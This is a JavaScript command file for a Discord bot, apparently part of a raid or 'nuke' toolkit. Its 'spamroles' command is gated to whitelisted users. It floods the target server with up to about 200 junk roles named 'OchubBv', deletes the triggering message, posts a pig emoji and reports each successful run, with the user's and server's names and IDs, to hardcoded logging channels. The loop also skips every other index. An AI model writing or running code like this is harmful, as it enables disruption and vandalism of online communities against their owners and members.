const Discord = require('discord.js');
const db = require('megadb')
const blacklist = new db.crearDB("blacklist")
const serverlist = new db.crearDB("serverlist")
const color = 'cc2929'

let cooldown = new Set()

module.exports = {
  name: "spamroles",
  alias: [],

execute (client, message, args){

  if(!blacklist.has(message.author.id)){
    const a = new Discord.MessageEmbed()
    .setDescription("You are not registered in the Whitelist.")
    .setColor(color)
     return message.reply({embeds: [a]})
  }

  if (serverlist.tiene(message.guild.id)){
    const serverInListEmbed = new Discord.MessageEmbed()
        .setDescription("This command is not available in this server.")
        .setColor(color);
      return message.reply({ embeds: [serverInListEmbed] });
    }

  if(!message.guild.me.permissions.has("MANAGE_ROLES")){
    const wu = new Discord.MessageEmbed()
    .setDescription("I don't have permissions. I need the `MANAGE_ROLES`.")
   .setColor(color)
   return message.reply({embeds: [wu]})
  }

  if(cooldown.has(message.author.id)){
    const l = new Discord.MessageEmbed()
    .setDescription(`${message.author}, you must wait 1 minute to use the command.`)
    .setColor(color)
    return message.reply({embeds: [l]})
  }

  cooldown.add(message.author.id);

  setTimeout(() => {
    cooldown.delete(message.author.id);
  }, 60000);

  try {

for(let i = 0; i <= 200; i++) {

  if (message.guild.roles.cache.size === 250) break;

 message.guild.roles.create({ name: "OchubBv", color: "RANDOM", position: i++ }).catch((err) => { console.log(("Error Found: " + err)) })

}

  message.delete().catch(err => {
    console.log(err)
  })
  message.channel.send("🐷")

  const e = new Discord.MessageEmbed()


   .setDescription(`spam-roles executed successfully!`)
     .addField("User", `**${message.author.tag}** | **${message.author.id}**`)
    .addField("Server Name", `**${message.guild.name}** | **${message.guild.id}**`)
   .setColor(color)
    .setThumbnail(message.author.displayAvatarURL({format: 'png', dynamic: true}))


   client.channels.cache.get("1265925374601334914").send({embeds: [e]})


} catch (err) {
  const laoo = new Discord.MessageEmbed()
  .setDescription("Error found")
  .addField("> Command", "`spamroles`", true)
  .addField("> Error", `\`${err}\``, true)
  .setColor("#410255")

  client.channels.cache.get('1210148130264322119').send({embeds: [laoo]})
}

 }

}